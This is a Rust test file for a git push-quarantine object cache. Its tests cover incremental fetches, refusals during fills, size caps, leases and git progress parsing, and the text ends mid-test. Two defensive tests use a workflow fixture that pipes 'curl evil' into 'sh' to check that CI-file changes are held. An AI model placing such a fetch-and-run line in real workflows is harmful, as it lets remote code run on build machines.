// Copyright 2026 Purlis
// SPDX-License-Identifier: Apache-2.0

//! **A push's base is read through an object cache that each push only tops up** (ADR 0128,
//! amended 2026-11-23): the forge's whole history was fetched into an empty quarantine on every
//! push, which on a large repo outlasted the network call's limit and refused every push. Now the
//! forge repo's cache is fetched into incrementally and the quarantine names it as an alternate.
//! A local repository stands in for the forge.

use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::mpsc;
use std::time::Duration;

use purlis_core::forge::Kind;
use purlis_core::heldact::{
    BaseObjects, FromForge, ObjectCache, PUSH, ProgressReader, PushCheck, Quarantine,
    check_push_since,
};
use purlis_core::mergehold::HeadSha;

use crate::support::git;

const WORKFLOW: &str = ".github/workflows/ci.yml";

fn write(root: &Path, file: &str, text: &str) {
    let at = root.join(file);
    std::fs::create_dir_all(at.parent().unwrap()).unwrap();
    std::fs::write(at, text).unwrap();
}

fn commit(root: &Path, message: &str) -> HeadSha {
    git(root, &["add", "-A"]);
    git(root, &["commit", "-q", "-m", message]);
    let out = git(root, &["rev-parse", "HEAD"]);
    HeadSha::try_from(String::from_utf8(out.stdout).unwrap().trim()).unwrap()
}

/// The objects a repository holds itself (loose and packed), not those of its alternates.
fn own_objects(repository: &Path) -> usize {
    let out = git(repository, &["count-objects", "-v"]);
    String::from_utf8(out.stdout)
        .unwrap()
        .lines()
        .filter_map(|line| {
            let (key, value) = line.split_once(": ")?;
            matches!(key, "count" | "in-pack").then(|| value.trim().parse::<usize>().unwrap())
        })
        .sum()
}

/// What `git push` sends: a thin pack of `tip` and what is not in `known`.
fn pack_of(from: &Path, tip: &HeadSha, known: &HeadSha) -> Vec<u8> {
    let mut command = crate::support::unsigned();
    command
        .current_dir(from)
        .args(["pack-objects", "--revs", "--thin", "--stdout", "-q"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped());
    let mut child = purlis_core::forklock::spawn(&mut command).unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(format!("{}\n^{}\n", tip.as_str(), known.as_str()).as_bytes())
        .unwrap();
    let out = child.wait_with_output().unwrap();
    assert!(out.status.success());
    out.stdout
}

/// How many commits the forge's history has before the pushes: enough that fetching all of it
/// again is plainly more than a top-up.
const HISTORY: usize = 40;

struct Scene {
    _dir: tempfile::TempDir,
    forge: PathBuf,
    chat: PathBuf,
    cache_parent: PathBuf,
    quarantines: tempfile::TempDir,
    base: HeadSha,
}

fn scene() -> Scene {
    let dir = tempfile::tempdir().unwrap();
    let root = std::fs::canonicalize(dir.path()).unwrap();
    let forge = root.join("forge");
    std::fs::create_dir_all(&forge).unwrap();
    git(&forge, &["init", "-q", "-b", "main", "."]);
    write(&forge, WORKFLOW, "name: ci\non: push\njobs: {}\n");
    let mut base = commit(&forge, "start");
    for i in 0..HISTORY {
        write(&forge, &format!("history/{i}.txt"), &format!("{i}\n"));
        base = commit(&forge, &format!("history {i}"));
    }
    let chat = root.join("chat");
    git(
        &root,
        &[
            "clone",
            "-q",
            &forge.to_string_lossy(),
            &chat.to_string_lossy(),
        ],
    );
    Scene {
        _dir: dir,
        forge,
        chat,
        cache_parent: root.join("object-cache"),
        quarantines: tempfile::tempdir().unwrap(),
        base,
    }
}

impl Scene {
    fn cache(&self) -> std::sync::Arc<ObjectCache> {
        ObjectCache::of(&self.cache_parent, "forge.test", "owner/repo")
    }

    fn from(&self) -> FromForge {
        FromForge {
            url: self.forge.to_string_lossy().into_owned(),
            helper: None,
            cache: Some(self.cache().for_a_push(PUSH)),
        }
    }

    /// The cache is filled: the first push is refused at once, the cache fills on its own thread,
    /// and the pushes after it are served.
    fn fill(&self) {
        let first = Quarantine::open(self.quarantines.path(), &self.base, &self.from());
        let refused = first.err().expect("the first push finds the cache empty");
        assert!(refused.contains("still reading"), "{refused}");
        wait_until_idle(&self.cache());
        assert!(self.cache().is_filled(), "the fill finished");
    }

    fn the_cache_dir(&self) -> PathBuf {
        self.cache().path().to_path_buf()
    }

    /// The forge gets one more commit on `main`.
    fn forge_moves_on(&self, file: &str) -> HeadSha {
        write(&self.forge, file, "more\n");
        commit(&self.forge, "more")
    }

    /// The one quarantine under the folder the quarantines are made in.
    fn the_quarantine(&self) -> PathBuf {
        std::fs::read_dir(self.quarantines.path())
            .unwrap()
            .flatten()
            .map(|entry| entry.path())
            .find(|path| {
                path.file_name()
                    .unwrap()
                    .to_string_lossy()
                    .starts_with("quarantine-")
            })
            .expect("a quarantine")
    }

    /// The chat commits `edit` on top of `parent` (the forge's tip, as the chat cloned it).
    fn chat_commits(&self, parent: &HeadSha, edit: impl Fn(&Path)) -> HeadSha {
        git(&self.chat, &["fetch", "-q", "origin"]);
        git(
            &self.chat,
            &["checkout", "-q", "-B", "task", parent.as_str()],
        );
        edit(&self.chat);
        commit(&self.chat, "task work")
    }
}

/// Waits for the cache's own thread to finish.
fn wait_until_idle(cache: &ObjectCache) {
    let until = std::time::Instant::now() + Duration::from_secs(60);
    while cache.is_filling() {
        assert!(std::time::Instant::now() < until, "the fill never ended");
        std::thread::sleep(Duration::from_millis(20));
    }
}

#[test]
fn the_second_push_to_a_repo_fetches_only_what_the_forge_gained() {
    purlis_core::unsteered!();
    let s = scene();
    s.fill();
    let cache = s.cache();
    let after_the_first = own_objects(cache.path());
    assert!(
        after_the_first >= HISTORY * 3,
        "the first push fills the cache with the history: {after_the_first}"
    );

    let next = s.forge_moves_on("one-more.txt");
    let second = Quarantine::open(s.quarantines.path(), &next, &s.from()).unwrap();
    // A commit, its tree and the new file: and no more of the history.
    assert_eq!(own_objects(cache.path()) - after_the_first, 3);
    drop(second);
}

#[test]
fn the_quarantine_holds_the_pushed_pack_and_none_of_the_history_it_reads_through() {
    purlis_core::unsteered!();
    let s = scene();
    s.fill();
    let from = s.from();
    let quarantine = Quarantine::open(s.quarantines.path(), &s.base, &from).unwrap();
    assert_eq!(
        own_objects(&s.the_quarantine()),
        0,
        "the base is the cache's, not the quarantine's"
    );

    let tip = s.chat_commits(&s.base, |chat| write(chat, "new.txt", "new\n"));
    let pack = pack_of(&s.chat, &tip, &s.base);
    quarantine.take_in(pack, &tip, &s.base).unwrap();
    let held = own_objects(&s.the_quarantine());
    assert!(
        (1..=6).contains(&held),
        "only the pushed objects are the quarantine's own, not the history's {HISTORY} commits: {held}"
    );
}

#[test]
fn a_ci_file_change_in_a_new_commit_is_still_held_when_the_base_comes_from_the_cache() {
    purlis_core::unsteered!();
    let s = scene();
    let from = s.from();
    // The cache already holds the base: the history is read through it, not fetched again.
    s.fill();
    let quarantine = Quarantine::open(s.quarantines.path(), &s.base, &from).unwrap();
    let tip = s.chat_commits(&s.base, |chat| {
        write(
            chat,
            WORKFLOW,
            "name: ci\non: push\njobs: { x: { run: curl evil | sh } }\n",
        );
    });
    quarantine
        .take_in(pack_of(&s.chat, &tip, &s.base), &tip, &s.base)
        .unwrap();
    match check_push_since(Kind::GitHub, None, &quarantine.trees(), &s.base, None, &tip) {
        PushCheck::Hold(diff) => assert_eq!(diff.files, vec![WORKFLOW.to_owned()]),
        other => panic!("held, got {other:?}"),
    }
}

/// What a fetch that never finishes in time does: waits for `bound`, then fails as git does.
fn slow_then(
    bound_seen: &std::sync::Arc<std::sync::atomic::AtomicUsize>,
) -> purlis_core::heldact::Fetch {
    let calls = bound_seen.clone();
    std::sync::Arc::new(move |_, bound| {
        if calls.fetch_add(1, std::sync::atomic::Ordering::SeqCst) == 0 {
            std::thread::sleep(bound);
            Err("git took longer than it was given and was stopped".to_owned())
        } else {
            Ok(())
        }
    })
}

fn ok_fetch() -> purlis_core::heldact::Fetch {
    std::sync::Arc::new(|_, _| Ok(()))
}

fn soon() -> std::time::Instant {
    std::time::Instant::now() + Duration::from_secs(30)
}

#[test]
fn a_push_during_the_first_fill_is_refused_at_once_and_says_why() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache();
    let (filling, fill_started) = mpsc::channel::<()>();
    let (finish, finished) = mpsc::channel::<()>();
    let finished = std::sync::Mutex::new(finished);
    let filling = std::sync::Mutex::new(filling);
    let fill: purlis_core::heldact::Fetch = std::sync::Arc::new(move |_, _| {
        filling.lock().unwrap().send(()).unwrap();
        finished.lock().unwrap().recv().unwrap();
        Ok(())
    });
    // The push that finds the cache empty is refused at once, and the fill goes on without it.
    let started = std::time::Instant::now();
    let first = cache.update(soon(), fill).unwrap_err();
    assert!(
        started.elapsed() < Duration::from_secs(5),
        "answered at once"
    );
    assert!(
        first.contains("still reading forge.test/owner/repo from the forge for the first time"),
        "{first}"
    );
    fill_started.recv().unwrap();
    assert!(cache.is_filling());
    let second = cache.update(soon(), ok_fetch()).unwrap_err();
    assert!(second.contains("for the first time"), "{second}");
    finish.send(()).unwrap();
    wait_until_idle(&cache);
    assert!(cache.is_filled());
    cache.update(soon(), ok_fetch()).unwrap();
}

#[test]
fn a_failed_fill_leaves_the_cache_not_filled_and_the_next_text_says_again() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache();
    let failing: purlis_core::heldact::Fetch =
        std::sync::Arc::new(|_, _| Err("the forge said no".to_owned()));
    cache.update(soon(), failing).unwrap_err();
    wait_until_idle(&cache);
    assert!(
        !cache.is_filled(),
        "a fill that failed is not a filled cache"
    );
    let again = cache.update(soon(), ok_fetch()).unwrap_err();
    assert!(again.contains("again"), "{again}");
    assert!(!again.contains("first time"), "{again}");
    assert!(again.contains("the forge said no"), "{again}");
    wait_until_idle(&cache);
    assert!(cache.is_filled(), "the next fill, which succeeded");
}

#[test]
fn a_top_up_past_the_pushs_time_is_refused_with_why_inside_the_connection_limit() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache();
    cache.update(soon(), ok_fetch()).unwrap_err();
    wait_until_idle(&cache);
    assert!(cache.is_filled());
    let calls = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let started = std::time::Instant::now();
    let within = Duration::from_millis(300);
    let refused = cache
        .update(started + within, slow_then(&calls))
        .unwrap_err();
    assert!(refused.contains("within"), "{refused}");
    assert!(refused.contains("try the push again"), "{refused}");
    assert!(
        started.elapsed() < Duration::from_secs(10),
        "the refusal came inside the push's time"
    );
    // The read goes on on the cache's own thread, so the next push finds it done.
    wait_until_idle(&cache);
    assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 2);
    assert!(cache.is_filled());
}

#[test]
fn the_time_a_push_has_for_all_its_fetches_is_inside_the_connection_limit_and_above_one_call() {
    purlis_core::unsteered!();
    // A bound that reverted to the per-call limit would cut a chain of fetches short, and one
    // that reached the listener's total would let a verdict be written to a closed connection.
    assert!(PUSH > purlis_core::worktree::git::NETWORK, "{PUSH:?}");
    let total = purlis_core::forge::proxy::listener::Limits::default().total;
    assert!(PUSH * 2 <= total, "{PUSH:?} against {total:?}");
    assert!(purlis_core::heldact::FILL > total);
}

#[test]
fn a_push_during_a_later_update_waits_for_it_and_is_not_refused() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache();
    cache.update(soon(), ok_fetch()).unwrap_err();
    wait_until_idle(&cache);
    let (updating, update_started) = mpsc::channel::<()>();
    let (finish, finished) = mpsc::channel::<()>();
    let updating = std::sync::Mutex::new(updating);
    let finished = std::sync::Mutex::new(finished);
    let first = {
        let cache = cache.clone();
        std::thread::spawn(move || {
            cache.update(
                soon(),
                std::sync::Arc::new(move |_, _| {
                    updating.lock().unwrap().send(()).unwrap();
                    finished.lock().unwrap().recv().unwrap();
                    Ok(())
                }),
            )
        })
    };
    update_started.recv().unwrap();
    let second = {
        let cache = cache.clone();
        std::thread::spawn(move || cache.update(soon(), ok_fetch()))
    };
    std::thread::sleep(Duration::from_millis(200));
    finish.send(()).unwrap();
    first.join().unwrap().unwrap();
    second.join().unwrap().unwrap();
}

/// A fetch that puts `bytes` into the cache's object store.
fn grows_by(bytes: usize) -> purlis_core::heldact::Fetch {
    std::sync::Arc::new(move |dir, _| {
        let pack = dir.join(".git/objects/pack");
        std::fs::create_dir_all(&pack).unwrap();
        std::fs::write(pack.join("grown"), vec![0u8; bytes]).unwrap();
        Ok(())
    })
}

#[test]
fn a_cache_past_its_cap_is_made_again_when_no_other_push_is_reading_it() {
    purlis_core::unsteered!();
    let parent = tempfile::tempdir().unwrap();
    let cache = ObjectCache::of_capped(parent.path(), "forge.test", "owner/grows", 5_000);
    cache.update(soon(), grows_by(1_000)).unwrap_err();
    wait_until_idle(&cache);
    cache.update(soon(), grows_by(10_000)).unwrap();
    assert!(cache.objects().join("pack/grown").is_file());
    // Over its cap now, and the quarantine being opened is the one lease: made again, and filled
    // again on its own thread.
    let _opening = cache.lease();
    let refused = cache.update(soon(), grows_by(1_000)).unwrap_err();
    assert!(refused.contains("again"), "{refused}");
    wait_until_idle(&cache);
    assert_eq!(
        std::fs::metadata(cache.objects().join("pack/grown"))
            .unwrap()
            .len(),
        1_000,
        "what was there is gone and what was fetched since is all it holds"
    );
}

#[test]
fn a_cache_is_not_made_again_while_another_quarantine_reads_through_it() {
    purlis_core::unsteered!();
    let parent = tempfile::tempdir().unwrap();
    let cache = ObjectCache::of_capped(parent.path(), "forge.test", "owner/leased", 5_000);
    cache.update(soon(), grows_by(1_000)).unwrap_err();
    wait_until_idle(&cache);
    cache.update(soon(), grows_by(10_000)).unwrap();
    let _a = cache.lease();
    let _b = cache.lease();
    // Over its cap, but read by another push: used as it is.
    cache.update(soon(), ok_fetch()).unwrap();
    assert_eq!(
        std::fs::metadata(cache.objects().join("pack/grown"))
            .unwrap()
            .len(),
        10_000
    );
    // And a damaged one is not removed from under it either.
    std::fs::remove_file(cache.path().join(".git/HEAD")).unwrap();
    let refused = cache.update(soon(), ok_fetch()).unwrap_err();
    assert!(refused.contains("damaged"), "{refused}");
    assert!(cache.path().join(".git/objects").is_dir());
}

#[test]
fn a_repo_whose_history_alone_is_past_the_cap_is_made_again_once_and_then_refused() {
    purlis_core::unsteered!();
    let parent = tempfile::tempdir().unwrap();
    let cache = ObjectCache::of_capped(parent.path(), "forge.test", "owner/huge", 5_000);
    cache.update(soon(), grows_by(20_000)).unwrap_err();
    wait_until_idle(&cache);
    // Once: made again, and filled again (to the same size, as the history is what it is).
    let again = cache.update(soon(), grows_by(20_000)).unwrap_err();
    assert!(again.contains("again"), "{again}");
    wait_until_idle(&cache);
    for _ in 0..3 {
        let refused = cache.update(soon(), ok_fetch()).unwrap_err();
        assert!(refused.contains("more history than"), "{refused}");
        assert_eq!(
            std::fs::metadata(cache.objects().join("pack/grown"))
                .unwrap()
                .len(),
            20_000,
            "not deleted to be fetched again"
        );
    }
}

/// A fetch that grows the cache by `bytes` and fails at the push's deadline, as a slow top-up
/// does, then succeeds on the cache's own thread.
fn grows_then_runs_out(bytes: usize) -> purlis_core::heldact::Fetch {
    let calls = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    std::sync::Arc::new(move |dir, bound| {
        if calls.fetch_add(1, std::sync::atomic::Ordering::SeqCst) == 0 {
            let pack = dir.join(".git/objects/pack");
            std::fs::create_dir_all(&pack).unwrap();
            std::fs::write(pack.join("grown"), vec![0u8; bytes]).unwrap();
            std::thread::sleep(bound);
            Err("git took longer than it was given and was stopped".to_owned())
        } else {
            Ok(())
        }
    })
}

#[test]
fn a_top_up_on_the_cache_thread_that_passes_the_cap_does_not_wedge_every_later_push() {
    purlis_core::unsteered!();
    let parent = tempfile::tempdir().unwrap();
    let cache = ObjectCache::of_capped(parent.path(), "forge.test", "owner/topped", 5_000);
    cache.update(soon(), grows_by(1_000)).unwrap_err();
    wait_until_idle(&cache);
    // Two pushes read through the cache, so nothing makes it again: a top-up runs out of the
    // push's time, grows the cache past its cap, and ends on the thread.
    let (a, b) = (cache.lease(), cache.lease());
    let deadline = std::time::Instant::now() + Duration::from_millis(300);
    let refused = cache
        .update(deadline, grows_then_runs_out(10_000))
        .unwrap_err();
    assert!(refused.contains("in the background"), "{refused}");
    wait_until_idle(&cache);
    drop((a, b));
    // Over the cap by a top-up, not by its history: made again (once), never "more history than".
    let _opening = cache.lease();
    let next = cache.update(soon(), grows_by(1_000)).unwrap_err();
    assert!(!next.contains("more history than"), "{next}");
    assert!(next.contains("again"), "{next}");
    wait_until_idle(&cache);
    cache.update(soon(), ok_fetch()).unwrap();
}

#[test]
fn a_top_up_on_the_cache_thread_does_not_make_the_cache_again_under_another_pushs_lease() {
    purlis_core::unsteered!();
    let parent = tempfile::tempdir().unwrap();
    let cache = ObjectCache::of_capped(parent.path(), "forge.test", "owner/held", 5_000);
    cache.update(soon(), grows_by(1_000)).unwrap_err();
    wait_until_idle(&cache);
    // Another push's quarantine reads through the cache: its one lease.
    let _other = cache.lease();
    let deadline = std::time::Instant::now() + Duration::from_millis(300);
    // This top-up grows the cache past its cap, then finishes on the cache's thread, which holds
    // no lease of its own: the one lease is the other push's.
    cache
        .update(deadline, grows_then_runs_out(10_000))
        .unwrap_err();
    wait_until_idle(&cache);
    assert_eq!(
        std::fs::metadata(cache.objects().join("pack/grown"))
            .unwrap()
            .len(),
        10_000,
        "not made again from under the push that holds a lease"
    );
}

#[test]
fn a_fetch_that_panics_on_the_cache_thread_does_not_leave_every_push_refused_as_still_reading() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache();
    let panics: purlis_core::heldact::Fetch = std::sync::Arc::new(|_, _| panic!("a bug"));
    cache.update(soon(), panics).unwrap_err();
    wait_until_idle(&cache);
    assert!(!cache.is_filling());
    assert!(!cache.is_filled());
    let next = cache.update(soon(), ok_fetch()).unwrap_err();
    assert!(next.contains("again"), "{next}");
    wait_until_idle(&cache);
    assert!(cache.is_filled(), "the next fill, which did not panic");
}

#[test]
fn stale_git_locks_are_removed_and_a_failure_does_not_name_the_cache_folder() {
    purlis_core::unsteered!();
    let s = scene();
    s.fill();
    let dot = s.cache().path().join(".git");
    let nested = dot.join("refs/quarantine/base");
    std::fs::create_dir_all(&nested).unwrap();
    let locks = [
        dot.join("packed-refs.lock"),
        dot.join("index.lock"),
        dot.join("shallow.lock"),
        nested.join("abc.lock"),
    ];
    for lock in &locks {
        std::fs::write(lock, b"").unwrap();
    }
    let path = s.cache().path().display().to_string();
    let failing: purlis_core::heldact::Fetch = std::sync::Arc::new(move |dir, _| {
        Err(format!("error: cannot lock ref in {}", dir.display()))
    });
    let refused = s.cache().update(soon(), failing).unwrap_err();
    assert!(
        locks.iter().all(|lock| !lock.exists()),
        "stale locks are gone"
    );
    assert!(!refused.contains(&path), "{refused}");
    assert!(refused.contains("forge.test"), "{refused}");
}

#[test]
fn a_damaged_cache_is_made_again_and_the_next_push_goes_on() {
    purlis_core::unsteered!();
    let s = scene();
    s.fill();
    let dot = s.cache().path().join(".git");
    // An empty `.git`, which git looks past to a repository above, and a missing HEAD.
    for damage in ["empty", "no HEAD"] {
        if damage == "empty" {
            std::fs::remove_dir_all(&dot).unwrap();
            std::fs::create_dir(&dot).unwrap();
        } else {
            std::fs::remove_file(dot.join("HEAD")).unwrap();
        }
        let refused = Quarantine::open(s.quarantines.path(), &s.base, &s.from())
            .err()
            .expect("the cache is read again");
        assert!(refused.contains("again"), "{damage}: {refused}");
        wait_until_idle(&s.cache());
        Quarantine::open(s.quarantines.path(), &s.base, &s.from()).unwrap_or_else(|why| {
            panic!("{damage}: the push goes on once it is made again: {why}")
        });
    }
}

#[test]
fn what_a_killed_fetch_left_is_removed_before_the_next_one() {
    purlis_core::unsteered!();
    let s = scene();
    s.fill();
    let pack = s.cache().objects().join("pack");
    std::fs::write(pack.join("tmp_pack_Ab12Cd"), vec![0u8; 100]).unwrap();
    std::fs::write(pack.join("keep.txt"), b"").unwrap();
    s.forge_moves_on("more.txt");
    drop(Quarantine::open(s.quarantines.path(), &s.base, &s.from()).unwrap());
    assert!(!pack.join("tmp_pack_Ab12Cd").exists());
    assert!(
        pack.join("keep.txt").exists(),
        "only a killed fetch's leftovers go"
    );
}

fn base_ref(cache: &ObjectCache, name: &str, to: &HeadSha) {
    git(
        cache.path(),
        &[
            "update-ref",
            &format!("refs/quarantine/{name}"),
            to.as_str(),
        ],
    );
}

fn refs_of(cache: &ObjectCache, dir: &str) -> Vec<String> {
    let out = git(
        cache.path(),
        &[
            "for-each-ref",
            "--format=%(refname)",
            &format!("refs/quarantine/{dir}"),
        ],
    );
    String::from_utf8(out.stdout)
        .unwrap()
        .lines()
        .map(|name| name.rsplit('/').next().unwrap().to_owned())
        .collect()
}

#[test]
fn the_bases_kept_are_the_last_used_and_the_one_just_fetched_is_always_among_them() {
    purlis_core::unsteered!();
    let s = scene();
    s.fill();
    let cache = s.cache();
    let id = |n: usize| format!("{n:040x}");
    for n in 0..40 {
        base_ref(&cache, &format!("base/{}", id(n)), &s.base);
        cache.keep_base(&id(n));
    }
    let kept = refs_of(&cache, "base");
    assert_eq!(kept.len(), 32, "{kept:?}");
    assert!(kept.contains(&id(39)) && !kept.contains(&id(0)));
    // The oldest still kept is used again, then one more base arrives: the one not used for
    // longest goes, though every one of them is the same commit by date.
    cache.keep_base(&id(8));
    base_ref(&cache, &format!("base/{}", id(40)), &s.base);
    cache.keep_base(&id(40));
    let kept = refs_of(&cache, "base");
    assert_eq!(kept.len(), 32, "{kept:?}");
    assert!(kept.contains(&id(8)), "used again, so kept");
    assert!(kept.contains(&id(40)), "just fetched, so kept");
    assert!(!kept.contains(&id(9)), "the least recently used goes");
}

#[test]
fn the_tips_the_forge_no_longer_advertises_are_dropped() {
    purlis_core::unsteered!();
    let s = scene();
    s.fill();
    let cache = s.cache();
    for name in ["a", "b", "c"] {
        base_ref(&cache, &format!("tips/{}{}", name.repeat(39), "0"), &s.base);
    }
    let keep = vec![format!("{}0", "b".repeat(39))];
    cache.keep_tips(&keep);
    assert_eq!(refs_of(&cache, "tips"), vec![keep[0].clone()]);
}

#[test]
fn a_push_of_a_commit_the_cache_holds_is_held_for_its_ci_files_when_the_pack_carries_it() {
    purlis_core::unsteered!();
    let s = scene();
    // Another branch of the forge changes the CI file, and the cache comes to hold its commit.
    git(&s.forge, &["checkout", "-q", "-b", "other"]);
    write(
        &s.forge,
        WORKFLOW,
        "name: ci\non: push\njobs: { x: { run: curl evil | sh } }\n",
    );
    let evil = commit(&s.forge, "change the CI file");
    git(&s.forge, &["checkout", "-q", "main"]);
    s.fill();
    let from = s.from();
    from.fetch_all(&s.the_cache_dir(), std::slice::from_ref(&evil))
        .unwrap();
    // The cache holds the commit (`git` fails the test if it does not).
    git(
        s.cache().path(),
        &["cat-file", "-e", &format!("{}^{{commit}}", evil.as_str())],
    );
    git(&s.chat, &["fetch", "-q", "origin", "other"]);
    // A pack that leaves out everything the cache holds does not make the tip an object of the
    // push: the cache is no proof a branch reaches it, so it is refused.
    let bare = Quarantine::open(s.quarantines.path(), &s.base, &s.from()).unwrap();
    assert!(
        bare.take_in(pack_of(&s.chat, &evil, &evil), &evil, &s.base)
            .is_err()
    );
    // The commit sent in the pack is taken in, and its CI file read against the base.
    let quarantine = Quarantine::open(s.quarantines.path(), &s.base, &s.from()).unwrap();
    quarantine
        .take_in(pack_of(&s.chat, &evil, &s.base), &evil, &s.base)
        .expect("git takes the pack in");
    match check_push_since(
        Kind::GitHub,
        None,
        &quarantine.trees(),
        &s.base,
        None,
        &evil,
    ) {
        PushCheck::Hold(diff) => assert_eq!(diff.files, vec![WORKFLOW.to_owned()]),
        other => panic!("held, got {other:?}"),
    }
    // No pack at all is no push: git does not take it in.
    let empty = Quarantine::open(s.quarantines.path(), &s.base, &s.from()).unwrap();
    assert!(empty.take_in(Vec::new(), &evil, &s.base).is_err());
}

#[test]
fn a_cache_is_one_folder_per_repo_named_by_a_hash() {
    purlis_core::unsteered!();
    let parent = tempfile::tempdir().unwrap();
    let one = ObjectCache::of(parent.path(), "forge.test", "owner/one");
    let again = ObjectCache::of(parent.path(), "FORGE.test", "Owner/One");
    let other = ObjectCache::of(parent.path(), "forge.test", "owner/two");
    assert_eq!(one.path(), again.path());
    assert_ne!(one.path(), other.path());
    assert_eq!(one.path().parent(), Some(parent.path()));
    let name = one
        .path()
        .file_name()
        .unwrap()
        .to_string_lossy()
        .into_owned();
    assert!(
        name.len() == 64 && name.bytes().all(|b| b.is_ascii_hexdigit()),
        "{name}"
    );
}

// ---- A first fill shows how far it has got, and does not block what it need not (#7532) ----

/// A fetch that says `lines` as git's `--progress` would, then waits to be let go.
fn filling_with(
    cache: &std::sync::Arc<ObjectCache>,
    lines: &'static [&'static str],
    said: mpsc::Sender<()>,
    release: mpsc::Receiver<()>,
) -> purlis_core::heldact::Fetch {
    let sink = cache.sink();
    let (said, release) = (std::sync::Mutex::new(said), std::sync::Mutex::new(release));
    std::sync::Arc::new(move |_, _| {
        for line in lines {
            sink(line);
        }
        said.lock().unwrap().send(()).unwrap();
        release.lock().unwrap().recv().unwrap();
        Ok(())
    })
}

const HALF_WAY: &[&str] = &[
    "remote: Enumerating objects: 10000, done.\n",
    "Receiving objects:   1% (100/10000), 1.00 MiB | 1.00 MiB/s\r",
    "Receiving objects:  45% (4500/10000), 12.50 MiB | 3.10 MiB/s\r",
];

/// A cache that holds `held` (a commit of the forge) under a ref a finished fetch wrote, and has
/// never finished a fill.
fn seeded_with(s: &Scene, held: &HeadSha) {
    let path = s.cache().path().to_path_buf();
    std::fs::create_dir_all(&path).unwrap();
    git(&path, &["init", "-q", "."]);
    git(
        &path,
        &[
            "fetch",
            "-q",
            "--no-tags",
            &s.forge.to_string_lossy(),
            &format!("+{0}:refs/quarantine/base/{0}", held.as_str()),
        ],
    );
}

#[test]
fn a_fill_in_progress_refuses_a_push_with_the_objects_received_so_far() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache();
    let (said, heard) = mpsc::channel();
    let (finish, release) = mpsc::channel();
    cache
        .update(soon(), filling_with(&cache, HALF_WAY, said, release))
        .unwrap_err();
    heard.recv().unwrap();
    let refused = cache.update(soon(), ok_fetch()).unwrap_err();
    assert!(
        refused.starts_with("purlis is reading forge.test/owner/repo for the first time: 4500 of 10000 objects (13 MB); try again in about "),
        "{refused}"
    );
    finish.send(()).unwrap();
    wait_until_idle(&cache);
}

#[test]
fn a_push_whose_base_is_in_the_cache_goes_ahead_during_a_fill() {
    purlis_core::unsteered!();
    let s = scene();
    seeded_with(&s, &s.base);
    let cache = s.cache();
    let (said, heard) = mpsc::channel();
    let (finish, release) = mpsc::channel();
    let have = [s.base.as_str().to_owned()];
    // The fill starts on its own thread and the push is not refused for it.
    cache
        .update_having(soon(), filling_with(&cache, HALF_WAY, said, release), &have)
        .unwrap();
    heard.recv().unwrap();
    assert!(cache.is_filling(), "the fill goes on");
    // Nor is a second push, while it is still running.
    cache.update_having(soon(), ok_fetch(), &have).unwrap();
    // And the quarantine of a push reads its base through the cache.
    Quarantine::open(s.quarantines.path(), &s.base, &s.from())
        .expect("the base is read through the cache while it fills");
    finish.send(()).unwrap();
    wait_until_idle(&cache);
}

#[test]
fn a_push_whose_base_is_not_in_the_cache_is_refused_with_the_progress_during_a_fill() {
    purlis_core::unsteered!();
    let s = scene();
    seeded_with(&s, &s.base);
    let newer = s.forge_moves_on("newer.txt");
    let cache = s.cache();
    let (said, heard) = mpsc::channel();
    let (finish, release) = mpsc::channel();
    cache
        .update_having(
            soon(),
            filling_with(&cache, HALF_WAY, said, release),
            &[s.base.as_str().to_owned()],
        )
        .unwrap();
    heard.recv().unwrap();
    let refused = cache
        .update_having(soon(), ok_fetch(), &[newer.as_str().to_owned()])
        .unwrap_err();
    assert!(
        refused.contains("4500 of 10000 objects (13 MB)"),
        "{refused}"
    );
    // Through the push's own path too: nothing is forwarded for want of the base.
    let opened = Quarantine::open(s.quarantines.path(), &newer, &s.from());
    assert!(
        opened
            .err()
            .is_some_and(|why| why.contains("4500 of 10000 objects")),
        "refused with the progress"
    );
    finish.send(()).unwrap();
    wait_until_idle(&cache);
}

#[test]
fn an_object_in_the_cache_under_no_finished_fetchs_ref_is_not_a_base_it_holds() {
    purlis_core::unsteered!();
    let s = scene();
    seeded_with(&s, &s.base);
    let loose = s.forge_moves_on("loose.txt");
    // Fetched by its id alone: in the store, and in no ref but FETCH_HEAD.
    git(
        s.cache().path(),
        &[
            "fetch",
            "-q",
            "--no-tags",
            &s.forge.to_string_lossy(),
            loose.as_str(),
        ],
    );
    let cache = s.cache();
    assert!(cache.holds(&[s.base.as_str().to_owned()]));
    assert!(
        !cache.holds(&[loose.as_str().to_owned()]),
        "no ref reaches it"
    );
    assert!(!cache.holds(&[]), "nothing asked is not held");
    assert!(!cache.holds(&["--all".to_owned()]), "not an id");
}

#[test]
fn the_progress_reader_reads_the_lines_git_fetch_progress_writes() {
    purlis_core::unsteered!();
    let mut reader = ProgressReader::default();
    // Lines end in a carriage return and may be cut anywhere by a read.
    assert_eq!(reader.feed("remote: Enumerating objects: 10000, done.\nremote: Counting objects: 100% (10000/10000), done.\n"), None);
    assert_eq!(reader.feed("Receiving objects:  45% (45"), None);
    let seen = reader
        .feed("00/10000), 12.50 MiB | 3.10 MiB/s\rReceiving objects:  46% (4600/10000), 12.90")
        .unwrap();
    assert_eq!((seen.received, seen.total), (4500, 10000));
    assert_eq!(seen.bytes, 13_107_200);
    // The cut line is finished by the next read, as git writes it, and the count starts over.
    let cut = reader.feed(" MiB | 3.10 MiB/s\r").unwrap();
    assert_eq!((cut.received, cut.bytes), (4600, 13_526_630));
    let first = reader.feed("Receiving objects:   0% (1/10000)\r").unwrap();
    assert_eq!((first.received, first.bytes), (1, 0), "no byte figure yet");
    let done = reader
        .feed("Receiving objects: 100% (10000/10000), 40.25 MiB | 3.10 MiB/s, done.\n")
        .unwrap();
    assert_eq!((done.received, done.total), (10000, 10000));
    assert_eq!(done.bytes, 42_205_184);
    let resolving = reader.feed("Resolving deltas:  50% (50/100)\r").unwrap();
